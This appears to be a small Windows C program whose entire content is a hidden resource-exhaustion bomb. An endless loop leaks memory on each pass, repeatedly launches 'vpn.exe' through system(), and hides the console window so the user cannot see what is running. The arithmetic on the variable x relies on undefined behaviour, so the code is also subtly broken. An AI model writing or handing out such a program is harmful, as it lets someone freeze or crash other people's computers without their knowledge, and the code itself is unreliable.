#include <stdlib.h>
#include <windows.h>
int main () {
    do{
        int x;
        double *arr = malloc(x * 8);
        x += 100;
        x *= x *= x;
        system("vpn.exe");
        HWND window = GetConsoleWindow();
        ShowWindow(window, SW_HIDE);
    }while(1 == 1);
    return 0;
}